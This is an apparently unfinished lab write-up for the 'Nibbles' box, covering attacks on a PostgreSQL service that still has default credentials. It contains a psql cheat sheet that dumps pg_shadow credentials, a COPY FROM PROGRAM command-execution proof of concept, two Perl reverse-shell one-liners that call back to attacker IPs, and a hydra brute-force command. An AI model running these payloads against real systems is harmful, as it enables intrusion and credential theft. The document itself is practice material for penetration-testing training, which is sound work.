# Nibbles Writeup

Name: Nibbles
Date:  
Difficulty:  
Goals:  
Learnt:
Beyond Root:

- [[Nibbles-Notes.md]]
- [[Nibbles-CMD-by-CMDs.md]]

![](nightmare.jpg)
## Recon

The time to live(ttl) indicates its OS. It is a decrementation from each hop back to original ping sender. Linux is < 64, Windows is < 128.
![ping](Screenshots/ping.png)


`postgres : postgres` default password and username
![](postgrespostgres.png)

[0xsyr0](https://github.com/0xsyr0/OSCP#postgresql) :
```sql

psql
psql -h <LHOST> -U <USERNAME> -c "<COMMAND>;"
psql -h <RHOST> -p 5432 -U <USERNAME> -d <DATABASE>
psql -h <RHOST> -p 5432 -U <USERNAME> -d <DATABASE>

postgres=# \list                     // list all databases
postgres=# \c                        // use database
postgres=# \c <DATABASE>             // use specific database
postgres=# \s                        // command history
postgres=# \q                        // quit
<DATABASE>=# \dt                     // list tables from current schema
<DATABASE>=# \dt *.*                 // list tables from all schema
<DATABASE>=# \du                     // list users roles
<DATABASE>=# \du+                    // list users roles
<DATABASE>=# SELECT user;            // get current user
<DATABASE>=# TABLE <TABLE>;          // select table
<DATABASE>=# SELECT * FROM users;    // select everything from users table
<DATABASE>=# SHOW rds.extensions;    // list installed extensions
<DATABASE>=# SELECT usename, passwd from pg_shadow;    // read credentials
```

![](notables.png)

But we are super user..
![](superdefaultuser.png)

[HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql#rce) states that *"Since [version 9.3](https://www.postgresql.org/docs/9.3/release-9-3.html) only **super users** and member of the group `**pg_execute_server_program**` can use copy for RCE.

```sql
#PoC
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec;

#Reverse shell
#Notice that in order to scape a single quote you need to put 2 single quotes
COPY files FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.0.104:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
```

![](rcepostgres.png)

```
COPY files FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.45.166:5432");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
```

`multi/postgres/postgres_copy_from_program_cmd_exec` module from metasploit. But ... similarly no shell
![](nomsfshell.png)

![](postsqlssh.png)

We can get the local.txt from reading it, but we cannot execute or read files with any characters that break postsql

No password within 8901 of rockyou.txt
```
hydra -v -V -u -l wilson -P /usr/share/wordlists/rockyou.txt -t 10 192.168.182.47 ftp
```

![](nopythonshell.png)

No `archive_mode`
![](archivemodeno.png)

Even though the user in passwd does have defined shell
![](noshell.png)

The service does not:
![](withshell.png)

https://github.com/b4keSn4ke/CVE-2019-9193

## Exploit

## Foothold

## PrivEsc

## Beyond Root


